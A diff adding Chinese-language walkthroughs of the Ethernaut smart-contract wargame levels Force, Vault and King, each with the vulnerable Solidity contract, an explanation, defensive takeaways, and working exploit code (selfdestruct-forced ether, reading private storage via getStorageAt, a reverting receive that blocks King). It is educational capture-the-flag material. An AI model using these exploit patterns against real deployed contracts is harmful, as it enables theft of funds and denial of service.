@@ -489,3 +489,162 @@ contract Delegation {
 
 - [SHA-3 - 维基百科，自由的百科全书](https://zh.wikipedia.org/wiki/SHA-3)
 - [sha3](https://web3js.readthedocs.io/en/v1.7.0/web3-utils.html?highlight=sha3#sha3)
+
+## 7. Force
+
+使合约的余额大于 0
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Force {/*
+
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+
+*/}
+```
+
+- 当合约自毁时，合约余额将转给指定目标
+    - 即使合约代码不包含 `selfdestruct` 的调用，仍然可以通过 `delegatecall` 或 `callcode` 来执行自毁操作
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Hack {
+
+  function pay() public payable {}
+
+  function exploit(address instance) public {
+    // 声明 payable 的函数和地址都可以接受转账
+    selfdestruct(payable(instance));
+  }
+}
+```
+
+在 Remix 向合约 `Hack` 转账
+
+![先填写 value，再点击 pay](img/ethernaut03.jpg)
+
+- 如果合约中包含声明了 `payable` 的 `receive` 或 `fallback` 函数，也可以在填写完 `VALUE` 后直接点击「Transact」；或通过声明了 `payable` 的构造函数，在创建合约时转账
+- 通过自毁的转账方式无法阻止，因此任何合约逻辑都不应基于 `address(this).balance == 0`
+
+### 参考资料
+
+- [Deactivate and Self-destruct](https://docs.soliditylang.org/en/v0.8.12/introduction-to-smart-contracts.html?highlight=destruct#deactivate-and-self-destruct)
+- [Payable | Solidity by Example](https://solidity-by-example.org/payable/)
+- [Low level interactions](https://remix-ide.readthedocs.io/en/latest/udapp.html?highlight=contract#low-level-interactions)
+
+## 8. Vault
+
+解锁保险柜
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Vault {
+  bool public locked;
+  bytes32 private password;
+
+  constructor(bytes32 _password) public {
+    locked = true;
+    password = _password;
+  }
+
+  function unlock(bytes32 _password) public {
+    if (password == _password) {
+      locked = false;
+    }
+  }
+}
+```
+
+- 猜密码是不可能猜的~ XD
+- 区块链上所有信息都是公开的，包括声明为 `private` 的变量
+- 合约中的变量按照定义的顺序存储在 slot 中
+
+```js
+// 首先确定变量定义的顺序，第一个变量存储在 slot 0，第二个变量存储在 slot 1，以此类推
+>> await web3.eth.getStorageAt(contract.address, 1)
+"0x412076657279207374726f6e67207365637265742070617373776f7264203a29"
+>> web3.utils.toAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
+"A very strong secret password :)"
+>> await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
+```
+
+- 将变量声明为 `private` 只能防止其它合约访问
+- 为了保证数据的机密性，应在上链前加密，密钥绝对不能公开。[zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/) 提供了一种在不暴露秘密信息的情况下，证明某人是否持有秘密信息的方法
+
+### 参考资料
+
+[Crypto Market Pool - Access private data on the Ethereum blockchain](https://cryptomarketpool.com/access-private-data-on-the-eth-blockchain/)
+
+## 9. King
+
+阻止关卡实例在提交后重新声明国王身份
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract King {
+
+  address payable king;
+  uint public prize;
+  address payable public owner;
+
+  constructor() public payable {
+    owner = msg.sender;  
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  receive() external payable {
+    // 即使转账金额小于 prize，合约的所有者也可以声明国王身份
+    require(msg.value >= prize || msg.sender == owner);
+    // 当前的转账金额会转给上一任国王
+    king.transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;  // 更新 prize
+  }
+
+  function _king() public view returns (address payable) {
+    return king;
+  }
+}
+```
+
+- 当 `transfer` 执行失败时，会抛出异常，交易回滚，关卡实例就无法再声明国王身份了
+- 查看当前最高金额
+
+    ```js
+    >> web3.utils.fromWei(await contract.prize())
+    "0.001"
+    ```
+- 新建合约，用于声明国王身份，并阻止关卡实例再成为国王
+
+    ```js
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.6.0;
+
+    contract Hack {
+
+      constructor() public payable {}
+
+      function exploit(address payable instance) public {
+        instance.call{value: 0.001 * (1 ether)}("");  // 汽油费一定要给足！
+        // 不能使用 transfer/send，默认 2300 汽油费不足以支撑后续操作
+      }
+
+      receive() external payable {
+        revert(); // 使 king.transfer 无法成功执行
+      }
+
+    }
+    ```
